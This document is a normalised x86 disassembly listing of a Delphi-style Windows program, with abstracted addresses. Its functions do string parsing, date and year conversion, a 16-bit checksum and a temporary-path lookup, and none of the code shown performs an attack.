mov edx [ ebp - 0x78 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
lea eax [ ebp - 0x7c ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x7c ]
mov eax ebx
call sub_40512c
lea eax [ ebp - 0x80 ]
push eax
mov edx [ ebp - 0x38 ]
add edx 0x1
jno r-xdata
mov ecx 0x3
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x80 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e34
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
push [ ebx ]
lea eax [ ebp - 0x84 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x84 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
sub_46f668
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_46f6ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
cmp [ rw-data ] 0x0
sete dl
mov eax [ r-xdata ]
call sub_46328c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
cmp [ rw-data ] 0x0
setne dl
mov eax [ r-xdata ]
call sub_46328c
call sub_46ece0
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6f1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_46f6f8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test cl cl
jne r-xdata
cmp cl 0x1
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_464d00
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ef70
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ee14
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404e98
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
jmp r-xdata
sub_46f7ac
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_4631dc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_46f7f4
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46f84c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jno r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f853
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov edx rw-data
mov eax [ r-xdata ]
call sub_462560
sub_46f858
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_46f8ab
push [ fs : eax ]
mov [ fs : eax ] esp
add [ rw-data ] 0x1
jno r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f8b2
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_46f668
sub_46f8b4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] ecx
mov ebp eax
mov edi 0x8
lea ebx [ esp + 0x4 ]
mov esi [ esp ]
movzx edx [ ebx ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ esi ] ax
add esi 0x2
add ebx 0x2
dec edi
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46f8f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov esi edx
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] ecx
mov ebp eax
mov edi 0x8
lea ebx [ esp + 0x4 ]
mov esi [ esp ]
movzx edx [ ebx ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov [ esi ] ax
add esi 0x2
add ebx 0x2
dec edi
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46f934
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
xor eax eax
push ebp
push sub_46f9b6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov edx esi
mov eax [ rw-data ]
call sub_46ee14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9bd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404edc
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462614
cmp eax 0xe0
jl r-xdata
cmp eax 0xef
jg r-xdata
mov bl 0x1
sub_46f9d4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46fa45
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_46ef70
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa4c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405270
sete bl
sub_46fa5b
inc [ edx ]
add [ eax ] al
add [ esi + 0x46 ] al
add [ eax ] al
push ebx
push esi
push edi
push ebp
mov ebp edx
xor ebx ebx
xor edi edi
mov eax ebp
call sub_406248
mov esi eax
cmp esi 0x1
jle r-xdata
test esi esi
jle r-xdata
mov edx edi
mov eax ebp
call sub_4649c8
movzx eax ax
add ebx eax
jae r-xdata
mov eax ebx
shr eax 0x10
and ebx 0xffff
add eax ebx
jae r-xdata
test ebp ebp
je r-xdata
sub esi 0x2
jno r-xdata
call sub_403e34
mov ebx eax
mov eax ebx
shr eax 0x10
add ebx eax
jae r-xdata
call sub_403e34
call sub_403e2c
cmp edi [ ebp - 0x4 ]
jb r-xdata
add edi 0x2
jno r-xdata
call sub_403e34
mov eax ebx
not ax
pop ebp
pop edi
pop esi
pop ebx
retn
call sub_403e34
movzx eax [ ebp + edi ]
add ebx eax
jae r-xdata
cmp esi 0x1
jg r-xdata
call sub_403e34
call sub_403e34
sub_46faf8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fb1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb24
retn
sub_46fdd4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4700b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x1
mov esi 0x1
mov [ ebp - 0x14 ] 0x1
xor edi edi
mov [ ebp - 0x1d ] 0x20
mov [ ebp - 0x1e ] 0x0
mov eax [ ebp - 0x4 ]
call sub_405120
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
call sub_405120
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
call sub_404e44
cmp esi [ ebp - 0x18 ]
jg r-xdata
lea eax [ ebp - 0x40 ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x40 ]
mov eax [ ebp + 0x8 ]
call sub_40512c
mov eax [ ebp + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4700bc
lea eax [ ebp - 0x40 ]
mov edx 0x8
call sub_404e68
retn
mov eax [ ebp - 0x4 ]
dec esi
test eax eax
je r-xdata
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
inc esi
movzx ebx [ eax + esi - 0x1 ]
mov eax ebx
call sub_4732a4
test al al
je r-xdata
mov eax 0x1
mov edx [ ebp - 0x8 ]
dec eax
test edx edx
je r-xdata
add esi 0x1
jno r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
add [ ebp - 0x10 ] 0x1
jno r-xdata
call sub_403e34
inc eax
cmp bl [ edx + eax - 0x1 ]
jne r-xdata
jmp r-xdata
call sub_403e34
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40502c
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov edx 0x1
call sub_464d34
test al al
je r-xdata
cmp [ ebp - 0x1d ] 0x20
jne r-xdata
add esi 0x1
jno r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_40502c
mov eax [ ebp - 0x2c ]
mov ecx r-xdata
mov edx 0x1
call sub_464d34
test al al
je r-xdata
cmp [ ebp - 0x1d ] 0x20
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_464d00
mov [ ebp - 0x1e ] al
cmp [ ebp - 0x1e ] 0x0
je r-xdata
add [ ebp - 0x10 ] 0x1
jno r-xdata
call sub_403e34
cmp bl [ ebp - 0x1d ]
jne r-xdata
mov edi esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x1
jno r-xdata
lea eax [ ebp - 0x30 ]
movzx edx [ ebp - 0x1d ]
call sub_40502c
mov eax [ ebp - 0x30 ]
mov ecx r-xdata
mov edx 0x1
call sub_464d34
test al al
jne r-xdata
call sub_403e34
cmp [ ebp - 0x1d ] 0x20
jne r-xdata
mov [ ebp - 0x1d ] 0x20
jmp r-xdata
add esi eax
jno r-xdata
call sub_403e34
cmp esi [ ebp - 0x18 ]
jle r-xdata
cmp [ ebp - 0x1e ] 0x0
jne r-xdata
mov [ ebp - 0x1d ] bl
mov edi esi
jmp r-xdata
call sub_403e34
mov eax esi
sub eax edi
jno r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x34 ]
push eax
mov ecx edi
sub ecx [ ebp - 0x14 ]
jno r-xdata
call sub_403e34
cmp edi [ ebp - 0x14 ]
jle r-xdata
add ecx 0x1
jno r-xdata
call sub_403e34
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x34 ]
mov eax [ ebp + 0x8 ]
call sub_40512c
mov eax [ ebp + 0x8 ]
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_40502c
mov eax [ ebp - 0x38 ]
mov ecx r-xdata
mov edx 0x1
call sub_464d34
test al al
jne r-xdata
call sub_403e34
add edi 0x1
jno r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x1e ] 0x0
call sub_403e34
cmp esi [ ebp - 0x18 ]
jg r-xdata
cmp [ ebp - 0x1e ] 0x0
jne r-xdata
push [ ebp - 0xc ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x3c ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0x3c ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_464d34
test al al
jne r-xdata
cmp esi [ ebp - 0x18 ]
jge r-xdata
add esi 0x1
jno r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_40512c
mov eax [ ebp + 0x8 ]
call sub_403e34
sub_4700ec
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_47017d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
call sub_463adc
mov edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax [ r-xdata ]
call sub_462668
cmp eax 0xffff
jbe r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0xa ] ax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx ]
mov eax [ r-xdata ]
call sub_462798
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470184
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
call sub_403e2c
sub_470188
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_470206
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
call sub_463adc
mov eax [ ebp - 0x4 ]
call sub_470984
movzx eax al
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] ax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx ]
mov eax [ r-xdata ]
call sub_462798
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47020d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_470214
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov esi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_470662
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov [ ebp - 0x1d ] 0x0
lea ecx [ ebp - 0x24 ]
mov edx [ esi ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404e98
mov eax [ esi ]
call sub_405120
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470669
lea eax [ ebp - 0x58 ]
mov edx 0xe
call sub_404e68
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
xor edx edx
push ebp
push sub_470625
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x28 ]
push eax
mov eax [ esi ]
mov ecx 0x3
mov edx 0x1
call sub_405384
mov eax [ ebp - 0x28 ]
call sub_47087c
test al al
jbe r-xdata
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ esi ]
mov eax r-xdata
call edi
dec eax
jle r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi ]
mov ecx 0x1
mov edx 0x4
call sub_405384
mov eax [ ebp - 0x2c ]
mov edx r-xdata
call sub_405270
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404edc
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ esi ]
mov eax r-xdata
call edi
mov edi eax
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx [ esi ]
mov eax r-xdata
call ecx
cmp edi eax
jge r-xdata
push 0x1
lea eax [ ebp - 0x34 ]
push eax
mov eax esi
mov cl 0x1
mov edx r-xdata
call sub_463adc
lea ecx [ ebp - 0x38 ]
mov edx [ esi ]
mov eax [ r-xdata ]
call sub_462798
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404e98
lea eax [ ebp - 0x30 ]
push eax
mov eax [ esi ]
mov ecx 0x1
mov edx 0x5
call sub_405384
mov eax [ ebp - 0x30 ]
mov edx r-xdata
call sub_405270
je r-xdata
push ebp
call sub_4700ec
pop ecx
push ebp
call sub_470188
pop ecx
push ebp
call sub_470188
pop ecx
push ebp
call sub_4700ec
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
mov edx esi
mov ecx 0x5
mov eax r-xdata
call sub_40540c
cmp di 0x76c
jne r-xdata
call sub_403e2c
push 0x1
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov ecx 0x76c
mov edx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_462668
mov edi eax
cmp edi 0xffff
jbe r-xdata
push 0x1
lea eax [ ebp - 0x3c ]
push eax
mov eax esi
xor ecx ecx
mov edx [ ebp - 0x8 ]
call sub_463adc
mov eax [ ebp - 0x3c ]
call sub_470984
test al al
jbe r-xdata
cmp di 0x50
jae r-xdata
mov edx [ esi ]
mov ecx 0x76c
mov eax [ r-xdata ]
call sub_462668
mov edi eax
cmp edi 0xffff
jbe r-xdata
cmp di 0x64
jae r-xdata
add di 0x7d0
jae r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404e98
call sub_403e2c
movzx eax [ ebp - 0xa ]
push eax
movzx ecx [ ebp - 0xc ]
mov edx edi
mov eax [ r-xdata ]
call sub_462778
fstp [ ebp - 0x18 ]
fwait
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ esi ]
mov eax r-xdata
call edi
test eax eax
jle r-xdata
add di 0x76c
jae r-xdata
jmp r-xdata
call sub_403e34
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ esi ]
mov eax r-xdata
call edi
test eax eax
jle r-xdata
mov bl 0x1
push 0x1
lea eax [ ebp - 0x40 ]
push eax
mov eax esi
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404e98
call sub_403e34
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ esi ]
mov eax r-xdata
call edi
test eax eax
jle r-xdata
mov [ ebp - 0x1d ] 0x1
push 0x1
lea eax [ ebp - 0x44 ]
push eax
mov eax esi
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404e98
lea ecx [ ebp - 0x58 ]
mov edx [ esi ]
mov eax [ r-xdata ]
call sub_462798
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov cl 0x1
mov edx r-xdata
call sub_463adc
push 0x1
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x10 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x48 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
mov edi eax
cmp edi 0xffff
jbe r-xdata
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x10 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x4c ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
cmp eax 0xffff
jbe r-xdata
call sub_403e2c
mov [ ebp - 0x1a ] ax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x10 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x50 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
cmp eax 0xffff
jbe r-xdata
call sub_403e2c
mov [ ebp - 0x1c ] ax
lea ecx [ ebp - 0x54 ]
mov edx [ esi ]
mov eax [ r-xdata ]
call sub_462798
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404e98
test bl bl
je r-xdata
call sub_403e2c
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp di 0xc
jne r-xdata
movzx eax [ ebp - 0x1c ]
push eax
push 0x0
movzx ecx [ ebp - 0x1a ]
mov edx edi
mov eax [ r-xdata ]
call sub_462750
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x18 ]
fwait
cmp di 0xc
jae r-xdata
xor edi edi
jmp r-xdata
movzx eax di
add eax 0xc
jno r-xdata
cmp eax 0xffff
jbe r-xdata
call sub_403e34
mov edi eax
call sub_403e2c
sub_4706d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_470750
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4055ac
mov eax [ ebx ]
call sub_405324
push eax
mov eax [ ebx ]
call sub_405120
test eax eax
jns r-xdata
push eax
call GetTempPathA
test eax eax
jns r-xdata
call sub_403e2c
mov edx ebx
xchg edx eax
call sub_4055ac
lea ecx [ ebp - 0x4 ]
mov edx [ ebx ]
mov eax [ r-xdata ]
call sub_462568
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470757
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_403e2c
sub_47075c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47081d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_405120
mov esi eax
cmp ebx 0xffffffff
jne r-xdata
mov eax edi
call sub_405120
sub eax esi
jno r-xdata
mov eax edi
call sub_405120
mov ebx eax
add eax 0x1
jno r-xdata
call sub_403e34
cmp ebx eax
jge r-xdata
call sub_403e34
mov eax edi
call sub_405120
sub eax esi
jno r-xdata
mov eax ebx
jmp r-xdata
add eax 0x1
jno r-xdata
call sub_403e34
mov ebx eax
cmp ebx 0x1
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470824
lea eax [ ebp - 0xc ]
call sub_404e44
retn
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_405384
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_464d00
test al al
je r-xdata
dec ebx
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
sub_470830
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_405120
mov esi eax
cmp esi ebx
jl r-xdata
mov eax ebp
mov edx edi
call sub_404e98
jmp r-xdata
test ebx ebx
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push ebp
mov edx esi
sub edx ebx
jno r-xdata
add edx 0x1
jno r-xdata
call sub_403e34
mov ecx ebx
mov eax edi
call sub_405384
call sub_403e34
sub_47087c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_470921
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ r-xdata ]
call sub_4626d8
mov eax [ ebp - 0x4 ]
push eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov eax r-xdata
mov [ ebp - 0xc ] eax
mov eax r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x6
pop eax
call sub_463930
add eax 0x1
jno r-xdata
cmp eax 0xff
jbe r-xdata
call sub_403e34
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470928
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_403e2c
sub_470984
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_470a51
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ r-xdata ]
call sub_4626d8
mov eax [ ebp - 0x4 ]
push eax
mov eax r-xdata
mov [ ebp - 0x34 ] eax
mov eax r-xdata
mov [ ebp - 0x30 ] eax
mov eax r-xdata
mov [ ebp - 0x2c ] eax
mov eax r-xdata
mov [ ebp - 0x28 ] eax
mov eax r-xdata
mov [ ebp - 0x24 ] eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov eax r-xdata
mov [ ebp - 0xc ] eax
mov eax r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x34 ]
mov ecx 0xb
pop eax
call sub_463930
add eax 0x1
jno r-xdata
cmp eax 0xff
jbe r-xdata
call sub_403e34
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470a58
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_403e2c
sub_470af0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_472af8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_470b3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_472ba8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470b42
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_470b48
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_470cdf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4626c4
mov eax [ ebp - 0x14 ]
mov ecx 0x5
mov edx 0x1
call sub_405384
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470ce6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x2d
je r-xdata
xor eax eax
push ebp
push sub_470caa
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x2
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x18 ]
